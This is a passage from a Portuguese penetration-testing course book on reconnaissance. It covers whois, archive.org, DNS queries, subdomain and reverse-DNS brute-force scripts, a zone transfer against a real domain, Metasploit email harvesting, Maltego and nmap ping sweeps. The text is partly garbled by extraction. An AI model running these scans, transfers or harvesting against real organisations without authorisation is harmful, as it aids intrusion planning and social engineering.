data-cfemail="2c5e4343586c474d4045">[email&#160;protected]</a>:~# whois www.guardweb.com.br % Copyright (c) Nic.br % The use of the data below is only permitted as described in % full by the terms of use at https://registro.br/termo/en.html , % being prohibited its distribution, commercialization or % reproduction, in particular, to use it for advertising or % any similar purpose. % 2017-05-21 20:57:41 (BRT -03:00)<br /> <br /> domain: guardweb.com.br owner: Bruno Fraga owner-c: BRFRA48 admin-c: BRFRA48 tech-c: BRFRA48 billing-c: BRFRA48 nserver: candy.ns.cloudflare.com nsstat: 20170518 AA nslastaa: 20170518 nserver: wesley.ns.cloudflare.com nsstat: 20170518 AA nslastaa: 20170518 saci: yes created: 20160917 #16104777 changed: 20170506 expires: 20170917 status: published nic-hdl-br: person: created: changed:<br /> <br /> BRFRA48 Bruno Fraga 20120814 20160209 90<br /> <br /> % Security and mail abuse issues should also be addressed to % cert.br, http://www.cert.br/ , respectivelly to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e083859294a083859294ce8292">[email&#160;protected]</a> % and <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a6cbc7cfca8bc7c4d3d5c3e6c5c3d4d288c4d4">[email&#160;protected]</a> % % whois.registro.br accepts only direct match queries. Types % of queries are: domain (.br), registrant (tax ID), ticket, % provider, contact handle (ID), CIDR block, IP and ASN.<br /> <br /> whois: Executa a aplicação WHOIS. www.guardweb.com.br: o alvo que será consultado.<br /> <br /> Observe que ele retornou informações sobre o domínio. Podemos incrementar esta pesquisa com alguns parâmetros, como em que servidor DNS iremos realizar a pesquisa sobre um domínio. Vamos pesquisar sobre o domino www.guardweb.com.br em um servidor root em Portugal. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1765787863577c767b7e">[email&#160;protected]</a>:~# whois www.guardweb.com.br -h whois.dns.pt www.guardweb.com.br no match -h: Conecta a um servidor para realizar a pesquisa. whois.dns.pt: Servidor que realizará a consulta. Observe que ele retornou uma mensagem dizendo que não há nenhum registro sobre o domínio solicitado neste servidor, pois ele não é uma autoridade subordinada ao domínio .com.br . No caso anterior, ele realiza a pesquisa apenas em root servers que são autoridades do domínio especificado, realizando a leitura dos últimos nomes de domínio .br e depois .com até chegar ao nome especificado. As informações obtidas através do WHOIS são cruciais para traçar uma estratégia de como você pode chegar ao alvo aplicando diversas técnicas, como engenharia social. Fonte: Videoaula TDI – Conhecer – Consultas WHOIS<br /> <br /> 91<br /> <br /> 4.<br /> <br /> archieve.org - O passado “O seu passado te condena” - Anonymous<br /> <br /> O archive.org é uma organização dedicada a manter um arquivo de recursos multimídia. Ela foi fundada por Brewster Kahle em 1996. O archive.org inclui dados da Web: cópias arquivadas de páginas da internet, com múltiplas cópias de cada página, mostrando assim a evolução da Web. O arquivo inclui também software, filmes, livros, e gravações de áudio. O acervo pretende manter uma cópia digital desses materiais para consulta histórica. Para utilizá-lo, abra um navegador e acesse o site e entre com o nome do site no campo de pesquisa. https://archive.org/ O processo que ele utiliza é bem simples: ele irá acessar um banco de dados de cache de páginas e mostrar através de uma página organizada e cronológica todos os caches encontrados, sendo possível ser acessados por qualquer pessoa na web.<br /> <br /> 92<br /> <br /> Como sabemos que nem tudo se inicia perfeito, pois geralmente as coisas vão se ajustando no percurso de sua existência, e as chances são enormes de que o seu alvo expôs algum dado, informação, configuração e arquivos multimídias sensíveis na página web, essa ferramenta pode se tornar poderosa nas mãos de um atacante, posto que é possível verificar caches antigos de um site alvo e coletar informações para diversos fins. Um atacante passará horas verificando página por página, verificando, procurando informações sensíveis para traçar uma meta de ataque.<br /> <br /> Observações: (01) Caso você seja responsável por informações em algum site, verifique-o para saber se existem informações sensíveis que foram expostas no passado do site. (02) Existem configurações que podem barrar este tipo de consulta, como a utilização de “robots exclusion standard”. Ele bloqueia a navegação de “robôs rastreadores da web” a certos ou a todos os conteúdos no site, com um simples arquivo na página raiz do site. Veja um exemplo de um arquivo “robot.txt” arquivo: User-agent: * Disallow: / User-agent: *: Significa que esta seção se<br /> <br /> aplica a todos os robôs.<br /> <br /> 93<br /> <br /> Disallow: /: Informa ao robô que não deve visitar nenhuma página do site. Fonte: Videoaula TDI – Conhecer – Archive.org (O Passado)<br /> <br /> 5.<br /> <br /> Consulta DNS<br /> <br /> Consultas DNS podem ajudar um atacante a identificar informações de hospedagem de um servidor, sendo ele um site ou serviços, como servidores de e-mail. Tomando conhecimento dos registros de DNS (A,AAAA,CNAME,MX,NS,PTR e SOA) vamos entender a ferramenta host, pois ela faz com que a leitura em servidores de DNS se tornem completa. Se nós conseguirmos algumas informações a respeito de serviços de DNS é possível que exista algum tipo de vulnerabilidade no DNS. Para realizar ataques Man-in-the-middle, como DNS Spoofing, basicamente temos que entender como os registros do DNS alvo podem estar vulneráveis a esses ataques. Vamos utilizar a ferramenta host, a qual faz parte da suíte de programas do Kali Linux. Para isso, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cab8a5a5be8aa1aba6a3">[email&#160;protected]</a>:~# host guardweb.com.br guardweb.com.br has address 104.31.87.52 guardweb.com.br has address 104.31.86.52 guardweb.com.br has IPv6 address 2400:cb00:2048:1::681f: 5734 guardweb.com.br has IPv6 address 2400:cb00:2048:1::681f: 5634 94<br /> <br /> guardweb.com.br mail is handled by 10 alt4.aspmx.l.google.com. guardweb.com.br mail is handled by 10 alt3.aspmx.l.google.com. guardweb.com.br mail is handled by 5 alt1.aspmx.l.google.com. guardweb.com.br mail is handled by 5 alt2.aspmx.l.google.com. guardweb.com.br mail is handled by 1 aspmx.l.google.com. host: Executa a aplicação host. guardweb.com.br: Nome do alvo a ser consultado. Observe que este comando retornou o endereço e vários outros registros existentes em sua configuração de DNS. Podemos utilizar algumas flags para incrementar uma pesquisa em um domínio. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b9cbd6d6cdf9d2d8d5d0">[email&#160;protected]</a>:~# host -t NS guardweb.com.br guardweb.com.br name server candy.ns.cloudﬂare.com. guardweb.com.br name server wesley.ns.cloudﬂare.com. -t NS: Exibe os endereços de onde os servidores de nomes estão armazenados. A partir dessas pesquisas é possível saber as informações dos servidores de DNS que hospedam os servidores e serviços de um alvo específico que um atacante esteja analisando. Realizando consultas através do DNS, além de obter informações sobre o alvo, é possível também realizar a enumeração de servidores que hospedam esses domínios sendo possível procurar vulnerabilidades que possam servir para realizar algum tipo de ataque que afete o alvo. Fonte: Videoaula TDI – Conhecer – Consulta DNS<br /> <br /> 95<br /> <br /> 6.<br /> <br /> Brute-force de pesquisa direta DNS<br /> <br /> Para agilizar o processo de pesquisa direta de DNS é importante termos scripts que automatizem esse processo, por exemplo, o processo de busca de subdomínios é algo que pode tomar muito tempo de um atacante e com scripts é possível obter resultados rapidamente. Vamos criar um script que realize esta tarefa. Primeiramente, crie ou baixe um arquivo com nomes de subdomínios. Como demonstrado abaixo, utilize o editor de sua preferência: www mail docs ftp tribo painel<br /> <br /> …<br /> <br /> Agora que temos uma lista com subdomínios, vamos criar o script que irá consultar o nosso arquivo subdomains.lst. Para criar o script, utilize um editor de texto e digite os códigos abaixo: #!/bin/bash for url in $(cat sub-domains.lst); do host $url.$1 |grep "has address" done #!/bin/bash : Indica a shell que o script irá utilizar para processar os comandos.<br /> <br /> 96<br /> <br /> for url in $(cat sub-domains.lst): Cria uma variável que irá verificar os nomes dentro do arquivo sub-domains.lst. do host $url.$1 |grep "has address": aplica o comando host na variável criado anteriormente e mostra apenas os resultados que serão encontrados, fazendo com que os nomes que ele não encontrar não sejam apresentados na tela. done: Finaliza o script. Para utilizar este script conceda permissão de execução para esse arquivo (chmod +x dnsscript.sh) e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="eb9984849fab808a8782">[email&#160;protected]</a>:~# ./dns-script.sh guardweb.com.br tribo.guardweb.com.br has address 104.31.87.52 tribo.guardweb.com.br has address 104.31.86.52 elb077374-1669637565.us-east-1.elb.amazonaws.com has address 23.23.157.46 elb077374-1669637565.us-east-1.elb.amazonaws.com has address 50.19.103.176 elb077374-1669637565.us-east-1.elb.amazonaws.com has address 23.23.215.151 ./dns-script.sh : ./ executa o arquivo script.sh. guardweb.com.br: Indica a URL a ser pesquisada os subdomínios. Observe que esse script retornou apenas as informações claras sobre os subdomínios da guardweb.com.br, desta forma foi realizada uma consulta brute-force direta de DNS.<br /> <br /> Observação: (01) Podemos encontrar arquivos com os inúmeros subdomínios mais utilizados na web. Assim, obteremos mais resultados sobre o alvo em questão.<br /> <br /> 97<br /> <br /> Fonte: Videoaula TDI – Conhecer – Script de pesquisa direta DNS<br /> <br /> 7.<br /> <br /> Brute-force DNS reverso<br /> <br /> Vamos criar um script que realizará a consulta de DNS reverso, o qual irá resolver o endereço IP buscando o nome de domínio associado ao host. Uma consulta DNS reverso é utilizada quando temos disponível o endereço IP de um host e não sabemos o endereço do domínio, então tentamos resolver o endereço IP através do DNS reverso, que procura qual nome de domínio está associado àquele endereço. Para criar o script, utilize um editor de texto e digite os códigos abaixo: #!/bin/bash for ip in $(seq 0 255); do host $1.$ip done for ip in $(seq 0 255);: Cria uma variável que irá realizar uma sequência de números a ser passada para o próximo comando. do host $1.$ip : Recebe uma entrada e combina com a variável ip e, depois, irá repassar para o comando host realizar a pesquisa do IP. Para utilizar esse script conceda permissão de execução para esse arquivo e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="55273a3a21153e34393c">[email&#160;protected]</a>:~# ./dns-reverse.sh 200.221.2 Host 0.2.221.200.in-addr.arpa. not found: 3(NXDOMAIN) Host 1.2.221.200.in-addr.arpa. not found: 3(NXDOMAIN) Host 2.2.221.200.in-addr.arpa. not found: 3(NXDOMAIN) Host 3.2.221.200.in-addr.arpa. not found: 3(NXDOMAIN) 98<br /> <br /> 4.2.221.200.in-addr.arpa domain name pointer domredir.bol.com.br. … Esse script irá pesquisar nomes em todos os IPs dentro da faixa de IP que inicia em 200.221.2 e retornará todo o resultado na tela. Veja que ele encontrou um IP e retornou o nome do servidor encontrado. Fonte: Videoaula TDI – Conhecer – Brute Force DNS Reverso<br /> <br /> 8.<br /> <br /> Transferência de Zonas DNS<br /> <br /> Transferência de zona DNS é um tipo de transação DNS, um dos vários mecanismos disponíveis para os administradores replicarem a base de dados de DNS através de um conjunto de servidores de transferência DNS. Uma transferência de zona pode ocorrer durante qualquer um dos seguintes cenários: 001 Quando o serviço de DNS é iniciado no servidor de DNS secundário. 002 Quando o tempo de atualização do servidor DNS expira. 003 Quando as alterações no arquivo de zona de trabalho são guardadas e há uma lista de notificação. Se existir um problema de configuração ou atualização do software de qualquer um desses servidores, podese explorar uma série de vulnerabilidades, tais como o envenenamento do banco de dados e a integridade e a confidencialidade do banco de dados do DNS primário ficarão comprometidas. 99<br /> <br /> Por exemplo, quando um servidor DNS primário está com a relação de domínios desatualizada e não consegue responder a uma solicitação, ele irá passar a consulta para o servidor secundário. Caso o servidor secundário não encontre uma resposta, ele irá passar para um server root. Realizando uma transferência de zona de DNS Va m o s r e a l i z a r u m t e s t e q u e i r á f o r ç a r a transferência de zona de DNS, com isso pode ser possível que exista algumas vulnerabilidades que irão trazer informações importantes a respeito do domínio, como quantas máquinas o host possui e quais delas estão disponíveis na estrutura deste domínio. Vamos supor um cenário para o teste. Primeiramente, vamos escolher um domínio e verificar quais são os seus servidores de domínio. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="31435e5e45715a505d58">[email&#160;protected]</a>:~# host -t ns globo.com globo.com name server ns04.globo.com. globo.com name server ns03.globo.com. globo.com name server ns01.globo.com. globo.com name server ns02.globo.com. host: Executa a aplicação utilitário de DNS host. -t ns: Indica o tipo de consulta sobre o domínio que será buscada, neste caso ns (name server). globo.com: Domínio que será analisado. Observe que ele irá apresentar todo os servidores de domínios que resolvem o nome para globo.com. Indicando o servidor a ser analisado: 100<br /> <br /> Para realizar a transferência de zona de DNS é necessário informar o NS a ser analisado. É importante testar em todos os servidores de nome. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="44362b2b30042f25282d">[email&#160;protected]</a>:~# host -l globo.com ns01.globo.com Using domain server: Name: ns01.globo.com Address: 131.0.24.26#53 Aliases: Host globo.com not found: 5(REFUSED) ; Transfer failed. host: Executa a aplicação utilitário de DNS host. -l: Faz com que o host execute uma transferência de zona para o nome da zona. Ele transfere a zona imprimindo os registros NS, PTR e endereço A/ AAAA na tela. Observe que a transferência de zona não foi bemsucedida, então vamos tentar no segundo NS ns02.globo.com. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7b0914140f3b101a1712">[email&#160;protected]</a>:~# host -l globo.com ns02.globo.com Using domain server: Name: ns02.globo.com Address: 64.151.87.25#53 Aliases: globo.com name server ns01.globo.com. globo.com name server ns02.globo.com. globo.com name server ns03.globo.com. globo.com name server ns04.globo.com. globo.com has address 186.192.90.5 www.01.globo.com has address 186.192.90.5 101<br /> <br /> www.0um.globo.com has address 186.192.90.53irmas.globo.com has address 186.192.90.5 7pecados.globo.com has address 186.192.90.5 www.7pecados.globo.com has address 186.192.90.5 tv.globo.com has address 186.192.81.37 tv.globo.com has IPv6 address 2804:294:4000:8000::5 colunas.tv.globo.com has address 186.192.90.5 webmail-191-252-36-120.globo.com has address 191.252.36.120 webmail-191-252-36-121.globo.com has address 191.252.36.121 webmail-191-252-36-122.globo.com has address 191.252.36.122 … Observe que nesse servidor o comando foi bemsucedido e ele trouxe informações de todos os registros de nomes e endereços IPs do domínio globo.com. Brute-force Transferência de Zona Para automatizar este processo é recomendado utilizar scripts. Veja um exemplo de um script que realiza o trabalho apresentado anteriormente: #!/bin/bash for server in $(host -t ns $1 | cut -d "" -f4); do host -l $1 $server; done<br /> <br /> 102<br /> <br /> Este script irá consultar os NS do domínio especificado, após isso ele irá forçar a transferência em cada NS encontrado. Fonte: Videoaula TDI – Conhecer – Transferência de Zona DNS<br /> <br /> 6.<br /> <br /> Ferramentas de Enumeração DNS<br /> <br /> As ferramentas de enumeração de DNS nos auxilia a pesquisar um determinado domínio de forma clara e organizada. As ferramentas mais conhecidas são dig e o dnsenum. Vamos testar essas ferramentas. 3.6.1. DIG – Utilitário DNS O dig é uma ferramenta que faz parte da suíte de programas do Kali Linux. Para utilizá-lo digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="21534e4e55614a404d48">[email&#160;protected]</a>:~# dig -t ns globo.com ; DiG 9.10.3-P4-Debian -t ns globo.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER use auxiliary/gather/search_email_collector Para verificar as opções digite: msf auxiliary(search_email_collector) > show options Module options (auxiliary/gather/search_email_collector):<br /> <br /> Name Current Setting Required Description ------ --------- -------- ----------DOMAIN yes The domain name to locate email addresses for OUTFILE no A ﬁlename to store the generated email list SEARCH_BING true yes Enable Bing as a backend search engine<br /> <br /> 129<br /> <br /> SEARCH_GOOGLE true backend search engine SEARCH_YAHOO true search engine<br /> <br /> yes yes<br /> <br /> Enable Google as a Enable Yahoo! as a backend<br /> <br /> Verifique se as opções para busca no Bing, Google e Yahoo estejam configuradas por padrão. Vamos configurar uma coleta através do domínio: msf auxiliary(search_email_collector) > set DOMAIN 4linux.com.br DOMAIN => 4linux.com.br Iniciando a coleta: msf auxiliary(search_email_collector) > run [*] Harvesting emails ..... [*] Searching Google for email addresses from 4linux.com.br [*] Extracting emails from Google search results... [*] Searching Bing email addresses from 4linux.com.br [*] Extracting emails from Bing search results... [*] Searching Yahoo for email addresses from 4linux.com.br [*] Extracting emails from Yahoo search results... [*] Located 4 email addresses for 4linux.com.br [*] <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7441454443164740475a404443444c44433440181d1a010c5a171b195a1606">[email&#160;protected]</a> [*] <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c5a6aaabb1a4b1aa85f1a9acabb0bdeba6aaa8eba7b7">[email&#160;protected]</a> [*] <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0e636f7c656b7a6760694e3a6267607b76206d6163206c7c">[email&#160;protected]</a> [*] <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8bfff9eee2e5eae6eee5ffe4cbbfe7e2e5fef3a5e8e4e6a5e9f9">[email&#160;protected]</a> [*] Auxiliary module execution completed Observe que ele retornou no console alguns e-mails encontrados.<br /> <br /> Dica: 130<br /> <br /> (01) É interessante você saber até que ponto os endereços de e-mail da sua empresa estão expostos, sendo possível evitar ser vítima desses ataques. ~#[Pensando_fora.da.caixa] Coletar e-mails pode ser utilizado para diversos fins, como engenharia social, rastreamento de usuários e engenharia reversa. Fonte: Videoaula TDI – Coletando Informações – Coleta de endereços de e-mail<br /> <br /> 6.<br /> <br /> Maltego<br /> <br /> O Maltego é uma ferramenta interativa de mineração de dados que processa gráficos direcionados para análise de links. A ferramenta é usada em investigações on-line para encontrar relações entre peças de informação de várias fontes localizadas na Internet. O Maltego usa a ideia de transformar para automatizar o processo de consulta de diferentes fontes de dados. Essas informações são exibidas em um gráfico baseado em nó adequado para executar a análise de link. Atualmente, existem três versões do cliente Maltego: Maltego CE, Maltego Classic e Maltego XL. Nossos testes serão focados no Maltego Community Edition (CE). Todos os três clientes Maltego vêm com acesso a uma biblioteca de transformações padrão para a descoberta de dados de uma ampla gama de fontes públicas que são comumente usados em investigações on-line e forense digital. 131<br /> <br /> Como o Maltego pode integrar-se perfeitamente com praticamente qualquer fonte de dados, muitos fornecedores de dados optaram por usar a Maltego como uma plataforma de entrega para seus dados. Isso também significa que o Maltego pode ser adaptado às suas próprias necessidades. Utilizando o Maltego CE A ferramenta Maltego CE faz parte da suíte de programas do Kali Linux. Para iniciar o programa, clique no menu: Applications > Information Gathering > maltegoce Para utilizar o programa é necessário realizar um registro, o qual é possível realizar a partir da inicialização do programa. Após realizar o Login vamos iniciar a máquina na opção “Footprint L1”, esta opção irá tentar colher informações básicas do domínio.<br /> <br /> 132<br /> <br /> Insira o domínio alvo a ser analisado:<br /> <br /> 133<br /> <br /> Será apresentado um gráfico na tela com informações de nomes do domínio, como os servidores de nome, website, AS, IPV4, MX record, Netblock e URLs, donos, entre outros, fazendo correlações de cada elemento.<br /> <br /> Podemos realizar buscas específicas em cada elemento apresentado, clicando com o botão. Veja alguns deles: 01 DNS:<br /> <br /> Elementos que podem ser pesquisados em um<br /> <br /> Converter IP para o Nome e vice-versa. 134<br /> <br /> 02 Elementos que podem ser pesquisados em um endereço de IP: Converter DNS para IP; Domínios usando MX NS; Detalhes do dono do IP. 03 Elementos que podem ser pesquisados em um Netblock (um range de IP);<br /> <br /> 135<br /> <br /> -<br /> <br /> Transformar em nomes de DNS; Exibir os endereços de IP; Exibir as informações de localização.<br /> <br /> São diversas as aplicações que podemos realizar nos e l e m e n t o s a p r e s e n t a d o s . Va m o s e x e c u t a r a transformação de todos os itens de um IPv4.<br /> <br /> Observe que ele expande ainda mais as informações do domínio específico. Neste caso, servidores DNS 136<br /> <br /> deste IPv4, Localização geográfica, donos, websites que nele contém e informações do range de IP. Essa árvore de elementos não para de crescer e é possível extrair muitas informações com esta ferramenta, de forma logica e extremamente organizada. Fonte: Videoaula TDI – Coletando Informações – Maltego<br /> <br /> 7.<br /> <br /> MAPA MENTAL<br /> <br /> Mapa mental, ou mapa da mente, é o nome dado para um tipo de diagrama, sistematizado pelo psicólogo inglês Tony Buzan, voltado para a gestão de informações, de conhecimento e de capital intelectual; para a compreensão e solução de problemas; na memorização e aprendizado; na criação de manuais, livros e palestras; como ferramenta de brainstorming (tempestade de ideias); e no auxílio da gestão estratégica de uma empresa ou negócio. Os mapas mentais procuram representar, com o máximo de detalhes possíveis, o relacionamento conceitual existente entre informações que n o r m a l m e n t e e s t ã o f ra g m e n t a d a s , d i f u s a s e pulverizadas no ambiente operacional ou corporativo. Trata-se de uma ferramenta para ilustrar ideias e conceitos, dar-lhes forma e contexto, traçar os relacionamentos de causa, efeito, simetria e/ou similaridade que existem entre elas e torná-las mais palpáveis e mensuráveis, sobre os quais se possa planejar ações e estratégias para alcançar objetivos específicos. 7.1.<br /> <br /> Criando um mapa de ataque 137<br /> <br /> O mapa mental é uma importante ferramenta para realizar um pentest, pois, por exemplo, é possível criar um mapa mental de ataque a partir de um domínio. Recapitulando o aprendizado até aqui apresentado, vamos supor o seguinte cenário: O nosso alvo poder ser um domínio específico na internet e queremos conseguir acesso ao sistema para realizar a cópia de um banco de dados, mas o que temos em mãos é somente o nome de domínio do site alvo. O primeiro passo que podemos realizar é coletar informações sobre o alvo, podemos utilizar vários caminhos para realizar a coleta, tanto como uma coleta passiva, sem ter contato direto com o alvo, por exemplo utilizando o Google Hacking, o Shodan, Censys entre outros, ou uma coleta ativa, quando realizamos o contato direto com o alvo, por exemplo utilizando ferramentas como o ping, Maltego, entre outros, utilizando a engenharia social, como realizar telefonemas, enviar e-mails para funcionários, até realizar aplicação para uma vaga na empresa. Com as informações coletadas é possível iniciar um processo de varredura no alvo, utilizar ferramentas para descobrir serviços ativos no servidor do domínio alvo, descobrir as portas abertas, verificar versões dos programas, entre outros. Todas essas informações podem ser documentadas de forma lógica e organizada. Dessa forma, este documento auxilia o atacante a conectar pontos estratégicos para realizar um ataque bem-sucedido. Veja um exemplo da criação de um mapa mental:<br /> <br /> 138<br /> <br /> Por exemplo: temos um domínio do alvo e queremos ganhar um acesso, vamos alimentar o mapa mental com informações do domínio e, após isso vamos coletar dados desse domínio de forma remota e descobrir qual o servidor está com a aplicação. Sendo assim, podemos realizar um scan para descobrir portas que estão abertas. Este servidor está executando o serviço FTP na porta 21, podemos utilizar alguns métodos para descobrir qual a versão desse serviço, depois realizar pesquisar para descobrir vulnerabilidades desta versão do serviço e possivelmente ganhar um acesso ao servidor e realizar a cópia do banco de dados. Documentando todas estas etapas, fica mais claro o processo de ataque, sendo possível conectar diversos pontos e encontrar novos caminhos para ter sucesso no ataque. Fonte: Videoaula TDI – Coletando Informações – Mapa Mental<br /> <br /> 139<br /> <br /> Chapter 05<br /> <br /> 140<br /> <br /> 2. ANALISAR<br /> <br /> UNIDADE 05<br /> <br /> Nesta sessão iremos expandir o nosso conhecimento para um ataque. De alguma forma tomamos conhecimentos do nosso alvo e realizamos algumas buscas para conhecê-lo e agora vamos iniciar a análise de tudo que foi coletado. Vamos validar e conhecer com mais detalhes, iremos testar comunicações e identificar status de portas. O nosso objetivo é conhecer ao máximo sobre o alvo, e caso você esteja realizando um mapa mental para algum projeto, esta etapa irá coletar dados cruciais para a expansão do mapa. 1.<br /> <br /> Ping Pong – varredura ICMP<br /> <br /> Vamos realizar alguns testes que podem ser utilizados para análise de comunicação com dispositivos. Abra o terminal no Kali Linux, digite o comando para verificar a comunicação: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1a6875756e5a717b7673">[email&#160;protected]</a>:~# ping 192.168.0.23 PING 192.168.0.23 (192.168.0.23) 56(84) bytes of data. 64 bytes from 192.168.0.23: icmp_seq=1 ttl=64 time=0.021 ms 64 bytes from 192.168.0.23: icmp_seq=2 ttl=64 time=0.033 ms 64 bytes from 192.168.0.23: icmp_seq=3 ttl=64 time=0.030 ms ^C --- 192.168.0.23 ping statistics --3 packets transmitted, 3 received, 0% packet loss, time 2025ms rtt min/avg/max/mdev = 0.021/0.028/0.033/0.005 ms ping: executa a aplicação ping. 141<br /> <br /> 192.168.0.23: dispositivo alvo, pode se utilizar o nome ou o endereço IP. Este comando verifica se o host está ativo. Observe que ele retorna os pacotes ICMP, então pode ser que o host alvo não responda ao ping pelo fato de ter alguma segurança aplicada. 1.1.<br /> <br /> FPING – varredura ICMP<br /> <br /> Para verificar a comunicação de vários dispositivos, podemos utilizar o FPING e passar um range de IP para serem analisados. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5f2d30302b1f343e3336">[email&#160;protected]</a>:~# fping -c1 -g 192.168.0.0 192.168.0.255 92.168.0.1 : [0], 84 bytes, 1.62 ms (1.62 avg, 0% loss) 192.168.0.4 : [0], 84 bytes, 70.6 ms (70.6 avg, 0% loss) 192.168.0.16 : [0], 84 bytes, 4.31 ms (4.31 avg, 0% loss) 192.168.0.19 : [0], 84 bytes, 81.0 ms (81.0 avg, 0% loss) ICMP Host Unreachable from 192.168.0.23 for ICMP Echo sent to 192.168.0.3 ICMP Host Unreachable from 192.168.0.23 for ICMP Echo sent to 192.168.0.6 ... fping : executa a aplicação fping -c: Quantidade de pacote a ser enviado, indicamos apenas 1. -g: Indicar o range de IP. Veja que a saída desse comando contém muita informação que não necessitamos no momento, então vamos melhorar a visualização deste comando, para que ele nos mostre apenas as saídas uteis. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="24564b4b50644f45484d">[email&#160;protected]</a>:~# fping -c1 -g 192.168.0.0 192.168.0.255 2> / dev/null > ativos.txt 2> : Envia as saídas de erros para /dev/null 142<br /> <br /> > : Envia as saídas sem erros para /root/ arquivos.txt. No comando anterior enviamos a saída do fping para um arquivo, agora vamos analisar o arquivo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="97e5f8f8e3d7fcf6fbfe">[email&#160;protected]</a>:~# cat ativos.txt 192.168.0.1 : [0], 84 bytes, 1.55 ms (1.55 avg, 0% loss) 192.168.0.4 : [0], 84 bytes, 2.36 ms (2.36 avg, 0% loss) 192.168.0.14 : [0], 84 bytes, 0.23 ms (0.23 avg, 0% loss) 192.168.0.5 : [0], 84 bytes, 250 ms (250 avg, 0% loss) 192.168.0.15 : [0], 84 bytes, 2.19 ms (2.19 avg, 0% loss) 192.168.0.23 : [0], 84 bytes, 2.15 ms (2.15 avg, 0% loss) Estes endereços que mostram nestes documentos são endereços de IP ativos na rede no momento da execução do comando. Para realizar uma visualização apenas dos endereços IP podemos utilizar o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="beccd1d1cafed5dfd2d7">[email&#160;protected]</a>:~# cat ativos.txt | cut -d " " -f1 192.168.0.1 192.168.0.4 192.168.0.14 192.168.0.5 192.168.0.15 192.168.0.23 cat: Visualiza o arquivo na tela, no caso o arquivo ativos.txt. |: Concatena os comandos antes do pipe (|) para o comando depois do pipe (|). cut: Corta o arquivo. -d: Delimita o que será cortado, no caso, tudo após espaço. -f: Delimita a coluna que será apresentada, neste caso a coluna 1. 143<br /> <br /> 1.2.<br /> <br /> NMAP – Ping Scan<br /> <br /> O NMAP também pode realizar essa varredura, porém ele nos traz mais informações, pois analisa os pacotes TCP que estão trafegando na rede e gera uma grande quantidade log na rede. Veja um exemplo de varredura ICMP com o nmap: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f2809d9d86b299939e9b">[email&#160;protected]</a>:~# nmap -sP 192.168.0.0/24 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-15 02:27 BST Nmap scan report for routerlogin.net (192.168.0.1) Host is up (0.0017s latency). MAC Address: 50:6A:03:48:30:4F (Netgear) Nmap scan report for 192.168.0.2 Host is up (0.0028s latency). MAC Address: 90:E7:C4:C9:98:35 (HTC) Nmap scan report for 192.168.0.10 Host is up (0.054s latency). MAC Address: BC:92:6B:93:33:84 (Apple) ... Nmap done: 256 IP addresses (14 hosts up) scanned in 8.32 seconds nmap: Executa a aplicação nmap. -sP: Essa flag realiza um Ping Scan em um range de IP. 192.168.0.0/24: Range a ser analisado. O nmap realiza um scan muito avançado, com muitas informações sobre o dispositivo. Vamos incrementar o comando do nmap para realizar a varredura de icmp e receber na tela apenas a informação dos IPs ativos na rede. 144<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="21534e4e55614a404d48">[email&#160;protected]</a>:~# nmap -sP 192.168.0.0/24 | grep for | cut -d “ “ -f5 routerlogin.net 192.168.0.2 192.168.0.4 192.168.0.5 192.168.0.8 192.168.0.14 192.168.0.15 192.168.0.16 192.168.0.23 |: concatena os comandos antes do pipe(|) para o comando depois do pipe(|). grep: exibe na saída ocorrências no texto após a palavra for. cut: corta o arquivo. -d: Delimita o que será cortado. No caso, tudo após “ “(espaço). -f: Delimita a coluna que será apresentada, neste caso a coluna 5. Observe que agora a saída do comando está apenas com as informações que necessitamos no momento.<br /> <br /> Dica: (01) Você pode criar scripts que automatizem este procedimento de scan de IP: abra um editor de texto e insira o script abaixo: #!/bin/bash echo "Insira o RANGE:" read RANGE nmap -sP $RANGE | grep for | cut -d “ “ -f5 echo "..sexy.tool.."<br /> <br /> 145<br /> <br /> Salve o arquivo com a extensão .sh, conceda permissão de execução para este arquivo (chmod +x nome_do_arquivo.sh) e divirta-se. ~#[Pensando_fora.da.caixa] Para bloquear respostas ICMP podemos utilizar o iptables. Algumas empresas bloqueiam a resposta ICMP para não serem alvos de ataques DoS. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aad8c5c5deeac1cbc6c3">[email&#160;protected]</a>:~# iptables -A INPUT -p icmp –icmp-type 8 -d 192.168.0.0/24 -j DROP iptables : Executa a aplicação iptables. -A INPUT: Acrescenta a regra a uma determinada chain, neste caso na chain INPUT (entrada de dados). -p icmp : -p define o tipo de protocolo ao qual a regra se destina, neste caso pacotes icmp. -icmp-type 8: O tipo de solicitação de “ICMP echo-request” será bloqueado pela regra. -d 192.168.0.0/24: Especifica o endereço/rede de destino utilizado pela regra, neste caso toda a rede 192.168.0.0. -j DROP: -j Indica o que deve ser feito com um determinado destino, neste caso DROP (barra um pacote silenciosamente). Através de um simples ping não conseguimos mais identiﬁcar se o host está ativo, caso tenha sido aplicado uma regra de ﬁrewall para bloquear respostas de pacotes ICMP, porém, com o nmap é possível realizar uma varredura e obter algum resultado. Isso acontece, pois o servidor alvo pode estar com algum 